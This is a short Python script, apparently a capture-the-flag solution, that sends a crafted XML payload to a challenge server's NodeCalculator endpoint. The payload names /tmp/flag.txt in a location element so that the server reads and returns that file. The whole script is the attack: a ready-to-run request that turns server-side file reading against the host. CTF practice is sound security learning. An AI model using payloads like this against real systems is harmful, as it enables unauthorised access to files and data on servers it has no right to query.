#!/usr/bin/env python3


import requests

# Define the XML payload
xml_payload = """
<Node>
    <location>/tmp/flag.txt</location>
</Node>
"""

# Define the URL to which you want to send the POST request
url = "https://braekerctf-nodecalculator.chals.io/NodeCalculator/nodeCalc"  # Replace this with your actual URL

# Define headers specifying the content type
headers = {
    "Content-Type": "application/xml"
}

# Send the POST request
response = requests.post(url, data=xml_payload, headers=headers)

if response.status_code == 200:
    print("Request successful!")
    print("Response:")
    print(response.text)